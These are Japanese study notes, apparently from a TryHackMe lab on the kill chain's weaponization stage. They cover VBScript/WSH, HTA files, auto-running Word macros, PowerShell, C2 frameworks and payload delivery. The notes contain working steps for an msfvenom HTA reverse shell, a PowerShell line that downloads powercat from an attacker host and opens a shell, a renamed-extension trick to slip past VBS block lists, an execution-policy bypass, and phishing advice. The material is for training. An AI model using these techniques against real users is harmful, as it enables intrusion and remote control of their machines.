## Weaponizationとは

- サイバーキルチェーンモデルの第2段階。この段階では、攻撃者は、Word文書やPDFなどの配信可能なペイロードを使用して、独自の悪意のあるコードを生成して開発する。
- このステージの目的は、悪意のある武器を使用してターゲットマシーンを悪用し、初期アクセスを獲得すること
- ほとんどの組織では、==Windows OSがターゲットとなる可能性が高い。==
- 組織の環境ポリシーでは、セキュリティ違反を避けるために、.exeファイルのダウンロードと実行をブロックすることがよくある。
- そのため、フィッシングキャンペーン、ソーシャルエンジニアリング、ブラウザやソフトウェアの悪用、USB、Webの方法など、さまざまなチャネルを介して送信されるカスタムペイロードの構築を頑張る

- 下図はweaponizationの例で、細工されたカスタムPDFやMicrosoft Officeドキュメントを使用して悪意のあるペイロードを配信している。カスタムペイロードは、攻撃者のインフラストラクチャのCommand & Control環境に接続するように設定している
![[Pasted image 20230609172557.png]]

- ⭐️[Red-teaming toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Initial-Access)にサイバーキルチェーンの段階毎に使えるツールがのっている。

- ほとんどの組織では、管理された環境内で .exe ファイルの実行をブロックまたは監視している。そのため、攻撃者は、Windowsに組み込まれているスクリプト技術など、他の技術を使用してペイロードを実行しようとるする。

# 効果的なスクリプト技術

## Windows Scripting Host - WSH

### 基本

- オブジェクトモデルであり、==PowerShellのまえに使われてたやつ==
- Windowsの組み込み管理ツールであり、バッチファイルを実行してOS内のタスクを自動化および管理するために使用される。
- WSHは、コマンドラインスクリプト用の`cscript.exe`とUIスクリプト用の`wscript.exe`というWindowsネイティブのエンジンを提供し、これらはvbsやvbeなどのさまざまなMicrosoft Visual Basic Script（VBScript）を実行する
- Windows OS上のVBScriptエンジンは、通常のユーザと同じアクセスレベルと許可でアプリケーションを実行するため、攻撃者にとって狙い目
###### 例

- 例えば、シンプルなVBScriptコードを作成して、Windowsのメッセージボックスに「Welcome to THM」と表示する
- 以下のコードを、例えばhello.vbsという名前のファイルに保存する
```js
Dim message 
message = "Welcome to THM"
MsgBox message
```
- `Dim message`: message変数の宣言。
- message変数にWelcome to THMという文字列の値を格納
- `MsgBox`関数を使用して、変数の内容を表示。

- そして、wscriptを使ってhello.vbsの内容を実行。
```cmd
wscript hello.vbs
```
- A Windowsメッセージがポップアップし、Welcome to THMのメッセージが表示される

###### 実践

- VBScriptを使って実行可能なファイルを実行する。
- 以下のvbsコードをファイルに保存する。これはWindowsの電卓を起動するもので、WSHを使って.exeファイルを実行できることを確認する
```js
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```
- 実行ペイロードを呼び出すために、CreateObjectを使用してWScriptライブラリのオブジェクトを作成。
- Runメソッドを利用して、ペイロードを実行。
- `&` 演算子は、文字列の結合を行う
- `WScript.ScriptFullName` は、現在のスクリプトファイルのフルパスを表す特殊な変数。これにより、スクリプト自体のパスを実行するコマンドに結合している
- `,` の後にある `0` は、実行時のウィンドウのスタイルを指定。この場合は通常のウィンドウを意味
-  `True` は、スクリプトの実行を待つかどうかを指定。`True` の場合、実行が終了するまでスクリプトが待機する
  
- UIスクリプト用の`wscript.exe`でexeファイルを実行する
```cmd
wscript [path to payload]
```
- もしくはコマンドラインスクリプト用の`cscript.exe`で実行する
```cmd
cscript.exe [path to payload]
```

###### もしVBSファイルがブラックリストに載っている場合
- ファイル名を.txtファイルに変更してwscriptで実行する
```cmd
wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```
- `/e:VBScript`: VBSとして実行する

### まとめ

- `wscript [.vbsファイル]` OR `cscript.exe [.vbsファイル]`で実行
- VBSファイルがそのままでは実行できない場合、vbsスクリプトを.txtファイル形式で保存→`wscript /e:VBScript`とする

## HTML Application - HTA

### 基本

- 表示とレンダリング（描画）に関するすべての情報を取り込んだダウンロード可能なファイルを作成することができる。
- HTAは、JScriptやVBScriptを含む動的なHTMLページ
	- JScript = Microsoft製の JavaScript ライクなスクリプト言語
- LOLBINSツールである*mshta.exe*を使用してHTAファイルを実行する。
- これは、単体で実行することも、Internet Explorerから自動的に実行することもできる。
- 普通のHTMLファイルのように記述するが、「Webページ」ではなく「ローカルアプリケーション」として実行される」
- IEの制限を受けず、ローカルファイルへのアクセス、レジストリ操作、ファイル書き込みなどが可能（＝高リスク）
- セキュリティサンドボックスをバイパスできるため、マルウェアの拡散に悪用されやすい

#### 例

##### cmd.exeを開く

- 証明のためにActiveXObjectを使用したペイロードを使用して、cmd.exeを実行するHTMLコードを`payload.hta`に保存する
```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
- ActiveXObjectは、Internet ExplorerやWindowsの一部で使用されるJavaScriptの機能。
- COMオブジェクトは、Windowsプラットフォーム上で様々な機能を提供するコンポーネント。
- ActiveXObjectを使用することで、JavaScriptからCOMオブジェクトをインスタンス化し、そのメソッドやプロパティにアクセスすることができる。例えば、ファイルの読み書きやシステムの制御など、==Windowsの機能をJavaScriptから利用する==
- ただし、ActiveXObjectは古いブラウザでしか使用できない。代わりにより新しいWeb APIや技術（例：fetch API、XMLHttpRequest、WebSocketなど）を使用する

- 攻撃者のマシンからpayload.htaをサーブする
```zsh
python -m http.server [Port]
```

- ターゲットマシンからMicrosoft Edgeを使用して悪意のあるリンクにアクセスする。`http://[AttackerIP]:[Port]/payload.hta`
- Runをクリック。成功
 ![[Pasted image 20230611095313.png | 200]]

##### reverse shellを確立

- ペイロードを作成する
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=443 -f hta-psh -o [output].hta
```
- `-f hta-psh`：HTA 形式で、PowerShellスクリプトを含んだペイロードを生成

- リスナーをセットアップ
```zsh
sudo nc -lnvp 443
```

- 攻撃者のマシンからペイロードをサーブする
```zsh
python -m http.server [Port]
```

- URLにアクセスし（`http://[Attacker_IP]:[Port]/[payload]`）、Runをクリックし成功

###### Metasploit

- `use exploit/windows/misc/hta_server`で、LHOST、LPORT、SRVHOST、Payloadなどの情報を設定しrun
- ターゲットマシンから、MetasploitからURLとして提供された悪意のあるHTAファイルにアクセスすると、reverse shell確立

## Visual Basic for Application - VBA

### 基本

- VBAとは、Microsoft WordなどのMicrosoftアプリケーション用に実装されたMicrosoft社のプログラミング言語。
- VBAプログラミングにより、ユーザとMicrosoft Officeアプリケーションの間のほぼすべてのキーボードおよびマウス操作のタスクを自動化することができる
  
- *マクロ*は、VBAとして知られるプログラミング言語で書かれたコードが埋め込まれたMicrosoft Officeアプリケーション。
- これは、自動化されたプロセスを作成することによって、手動タスクをスピードアップするためのカスタム関数を作成するために使用される。
- VBAの特徴の1つは、Windows APIやその他の低レベルの機能へのアクセスがあること。
- ==HTAやWSHなど、これまで取り上げてきた手法と組み合わせることができる==。VBA/マクロ単体では、検出を回避することはできない

#### 実践例

- VBAの基礎と、攻撃者がマクロを使用して悪意のあるMicrosoftドキュメントを作成する方法について学習する

##### メッセージの表示

 1. Wordを開く。開いてプロダクトキーのウィンドウが出たらそれを閉じる
 2. Microsoft Office使用許諾契約書が表示されたら同意する
 3. 最初のマクロを作成するために、Blank Documentを作成。目的は、この言語の基本を説明し、Word文書が開かれたときにそれを実行する方法を示すこと
 4. 開いたドキュメントから、view -> macrosでVisual Basic Editorを開く。文書内に独自のマクロを作成するために、Macrosウィンドウが表示される
 ![[Pasted image 20230611105037.png | 300]]
 5. Macro nameにマクロの名前を入力し、Macros in: のリストからDocument 1を選択し、Createボタンを押すことで、Microsoft Visual Basic for Applicationsエディタが開く
![[Pasted image 20230611105502.png | 400]]
6. VBAコードを書く。ここでは例としてメッセージボックスを表示する
```js
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```
- `Sub`: Subroutine（サブルーチン）。特定の操作を実行するためのマクロを作成する際に、マクロの本体を定義

7. **マクロを保存する前に実行テストを必ず行う。** Runタブ -> Run Sub/UserFormをクリック。これでメッセージボックスが表示される

8. さらに、ドキュメントが開かれる都度VBAコードを自動的に実行するように設定する。ただし、ドキュメントを開いたときに実行される関数名を指定する必要がある（この例ではTHM関数）
```js
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```
- `Document_Open()` サブルーチンは、Wordドキュメントが開かれたときに自動的に実行する
- `AutoOpen()` サブルーチンは、起動されたときにTHMサブルーチンを自動的に実行する
- `THM()` サブルーチンは、メッセージボックスを表示するための処理を含んでいる

9. File > Save Doc 1 > Save as Word 97-2003 Document > save
- Word 97-2003は古いwordバージョンでも互換性があるし、word2016でも使える。マクロが有効なフォーマット

10. 作成したドキュメントを閉じ、再度開くとWarningが出るので、Enable Contentとする。成功。
![[Pasted image 20230611113228.png | 300]]

##### 電卓の表示
1. VBSを作成(保存する前にRun -> Run Sub/UseFormで必ずテストをする　)
```js
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```
- `Dim`: 変数と型を設定
- `CreateObject("Wscript.Shell").Run payload` で Windows Scripting Host (WSH) オブジェクトを作成しペイロードを実行する

2. うまく行ったので、ドキュメントを開いた時に自動的に実行されるよう改変する
```js
Sub Document_Open()

End Sub

Sub AutoOpen()
  PoC
End Sub

Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

## PowerShell - PSH
[🏋️PowerShell](../../../Tools/🏋️PowerShell.md)

### 基本
- デフォルトでは、Execution Policyによってセキュリティのために.ps1の実行を無効にしている。PowerShellの実行ポリシーは"Restricted"に設定されており、個々のコマンドは許可するが、スクリプトの実行は許可しない
- Execution Policyの確認をする
```powershell
Get-ExecutionPolicy
```
- Execution Policyの変更をする
```powershell
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```
- [ポリシーの詳細](https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.3#:~:text=PowerShell%20%E5%AE%9F%E8%A1%8C%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC-,%E3%81%93%E3%82%8C%E3%82%89%E3%81%AE%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC,-%E3%81%AE%E9%81%A9%E7%94%A8%E3%81%AF)

### 実例
- Execution Policyをバイパスしてps1スクリプトを実行する方法
```powershell
powershell -ep bypass [ps1 script]
```

##### リバースシェルを確立する
- [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)を使用
- 攻撃者側でpowercatをターゲットマシンにダウンロードさせるためのリスナーを立てる。
```zsh
python -m http.server
```
- リバースシェルの接続を待ち受けるリスナーを立てる。
```zsh
nc -lnvp [port]
```

- ダウンロードしつつ実行する
```powershell
(New-Object Net.WebClient).DownloadFile('http://[AttackerIP]:[Port]/[FileName]'); powercat -c [AttackerIP] -p [Port] -e cmd
```

##  Command And Control - (C2 Or C&C)

### 基本
- 侵入後の操作において、攻撃側がハッキングしたマシンを操作し、コントロールするためのフレームワークのこと。
- C2フレームワークは、以下のような操作を簡単かつ迅速に行うための手段がある

- 様々な悪意のあるペイロードの生成
- 侵害されたマシンやネットワークの列挙
- 特権の昇格やピボッティング
- LatMov
- その他多くの操作

- Cobalt Strike（使用禁止)、PowerShell Empire、Metasploit(使用禁止)など。

### PowerShell Empire
- 攻撃者がキーや共有パスワードを使用して複数のサーバーで共同作業を行うための、オープンソースのフレームワークで
- PowerShellとPythonエージェントをベースとしている。
- WindowsとActive Directory環境のクライアントサイドとポストエクスプロイトに重点を置いている。
- 詳細は[tryhackme empire](https://tryhackme.com/room/rppsempire)

## Delivery Techniques

### Email
- リンクや添付ファイル付きのフィッシングメールを送信することで、ペイロードを送信する
- 悪意のあるファイルが添付される。目的は、被害者に悪意のあるウェブサイトを閲覧させるか、悪意のあるファイルをダウンロードして実行させ、ターゲットのネットワークやホストにアクセスすること
- phisingを目的とした独自のインフラを持つ必要がある。DKIM、SPF、DNSポインター（PTR）レコードなど、メールサーバー内で様々なオプションを設定する必要がある
- Google Gmail、Outlook、Yahooなど、評判の良いサードパーティのメールサービスを利用することも可能
- 企業内でハッキングしたメールアカウントを使用して、企業内または他者にフィッシングメールを送信することもある。漏洩した電子メールは、フィッシングや、パスワードスプレー攻撃などの他の手法で利用される可能性がある

### Web
- 攻撃者が管理するWebサーバーに悪意のあるペイロードをホストする方法。
- Webサーバーは、そのドメイン名やTLS証明書のクリーンな記録と評判など、セキュリティガイドラインに従う。
- この方法には、ターゲットが悪意のあるファイルを閲覧したりダウンロードしたりするようにソーシャルエンジニアリングするなどのテクニックも含まれる。
- この方法を使用する場合、URL短縮ツールを使用すると便利 [ツール一覧](https://www.sedesign.co.jp/blog/5-url-shortening-services-recommended#:~:text=URL%E7%9F%AD%E7%B8%AE%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%A8%E3%81%AF,%E3%81%A8%E3%81%95%E3%81%9B%E3%82%8B%E5%8A%B9%E6%9E%9C%E3%81%8C%E3%81%82%E3%82%8A%E3%81%BE%E3%81%99%E3%80%82)
- 攻撃者は、Javaやブラウザなどの脆弱性を悪用するなど、ゼロ攻撃を利用して、フィッシングメールやWebデリバリーテクニックを使用してターゲットマシンにアクセスを取得することができる

### USB
- ターゲットに悪意のあるUSBを物理的に接続する必要がある
- 多くの場合、組織はセキュリティのために、組織環境内でUSBの使用を無効にするなどの強力なポリシーを確立している。一方、ターゲット環境での使用を許可する組織もある
- [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe)
- [USBHarpoon](https://www.minitool.com/news/usbharpoon.html)
	- [O.MG Cable](https://shop.hak5.org/products/omg-cable)
- などがある。
